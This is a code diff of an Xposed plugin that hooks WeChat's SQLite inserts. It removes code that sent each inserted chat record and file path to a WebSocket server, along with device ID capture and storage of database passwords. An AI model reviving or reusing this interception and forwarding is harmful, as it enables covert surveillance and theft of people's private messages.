@@ -10,35 +10,18 @@ import com.lu.lposed.plugin.IPlugin
 import com.lu.magic.util.ReflectUtil
 import com.lu.magic.util.log.LogUtil
 import com.lu.wxmask.ClazzN
-import com.lu.wxmask.bean.DBItem
-import com.lu.wxmask.http.WebSocketClient
-import com.lu.wxmask.http.androidId
-import com.lu.wxmask.util.WxSQLiteManager
 import com.lu.wxmask.util.ext.toJson
 import de.robv.android.xposed.IXposedHookZygoteInit.StartupParam
 import de.robv.android.xposed.XC_MethodHook
 import de.robv.android.xposed.XSharedPreferences
 import de.robv.android.xposed.XposedBridge
 import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam
-import org.json.JSONObject
-import java.io.File
 
 class ChatRoomPlugin : IPlugin {
     private var sharedPreferences: XSharedPreferences? = null
 
-    private val socketClient by lazy {
-        WebSocketClient.start()
-    }
-
     @SuppressLint("HardwareIds")
     override fun handleHook(context: Context, lpparam: LoadPackageParam) {
-        androidId = try {
-            Secure.getString(context.contentResolver, "android_id")
-        } catch (e: Exception) {
-            ""
-        }
-        socketClient
-
 //        handleLoadPackage(lpparam)
         LogUtil.i("ChatRoomPlugin handleHook")
 //        val listViewField = XposedHelpers2.findField(
@@ -73,12 +56,8 @@ class ChatRoomPlugin : IPlugin {
                 override fun beforeHookedMethod(param: MethodHookParam) {
                     super.beforeHookedMethod(param)
                     val dbName = param.thisObject.toString().substring("SQLiteDatabase:".length).trim()
-                    LogUtil.i("param.thisObject = $dbName")
+//                    LogUtil.i("param.thisObject = $dbName")
                     val tableName = param.args[0].toString()
-                    WxSQLiteManager.Store[dbName] = DBItem(dbName, WxSQLiteManager.Store[dbName]?.password, param.thisObject)
-//                    if (!WxSQLiteManager.Store.contains(dbName)) {
-//                        WxSQLiteManager.Store[dbName] = DBItem(dbName, null, param.thisObject)
-//                    }
                     val values = param.args[2] as ContentValues
                     printInsertLog(
                         context,
@@ -114,28 +93,6 @@ class ChatRoomPlugin : IPlugin {
                     + "; conflick values: " + arrayConflictValues[conflickValue]
                     + "; contentValues: " + contentValues.toJson()
         )
-
-        WebSocketClient.sendMessage(contentValues.toJson())
-        //DupCheckInfo 文件
-        when (tableName) {
-            "message" -> {
-                val message = JSONObject(contentValues.toJson()).apply {
-                    put("type", "webhook")
-                }
-//                WebSocketClient.sendMessage(message.toString())
-            }
-
-            "DupCheckInfo" -> {
-                val filePath = contentValues.getAsString("path")
-                val file = File(filePath)
-//                WebSocketClient.uploadFile(file.name, file)
-            }
-
-            "voiceinfo" -> {
-            }
-        }
-
-        //AppMessage 电脑版发送文件消息
     }
 
     fun handleLoadPackage(loadPackageParam: LoadPackageParam) {
